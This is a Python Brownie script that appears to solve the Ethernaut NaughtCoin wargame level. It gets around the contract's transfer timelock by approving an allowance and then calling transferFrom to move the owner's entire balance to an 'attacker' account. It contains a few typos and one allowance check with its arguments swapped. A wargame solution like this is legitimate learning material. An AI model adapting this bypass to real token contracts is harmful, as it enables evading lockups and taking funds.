from brownie import network, NaughtCoin
from brownie.exceptions import VirtualMachineError
from scripts.helpful import get_account, LOCAL_NETWORKS
import brownie


def deploy(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = NaughtCoin.deploy(
        account.address, {"from": account}, publish_source=publish
    )
    print(
        f"Cotntract --NaughtCoin-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def main():
    owner_account = get_account(0)
    attacker_account = get_account(1)
    contract = deploy(owner_account)
    owner_balance = contract.balanceOf(owner_account.address)
    print(f"Balance of {owner_account.address} is {owner_balance}")
    print(
        f"Balance of {attacker_account.address} is {contract.balanceOf(attacker_account.address)}"
    )
    print("trying to transfer")
    try:
        tx = contract.transfer(
            attacker_account.address, owner_balance, {"from": owner_account}
        )
        tx.wait(1)

    except VirtualMachineError:
        from time import sleep

        sleep(1)
        print("Transaxtion reverted")
    print(
        f"Approved allovenc {contract.allowance(attacker_account.address, owner_account.address)}"
    )
    print("Approving transaction")
    tx = contract.approve(owner_account.address, owner_balance, {"from": owner_account})
    tx.wait(1)
    print(
        f"Approved allovenc {contract.allowance(owner_account.address, attacker_account.address)}"
    )
    print("Sending coins")
    tx = contract.transferFrom(
        owner_account.address, attacker_account.address, owner_balance
    )
    tx.wait(1)
    print(
        f"Balance of {owner_account.address} is {contract.balanceOf(owner_account.address)}"
    )
    print(
        f"Balance of {attacker_account.address} is {contract.balanceOf(attacker_account.address)}"
    )


if __name__ == "__main__":
    main()
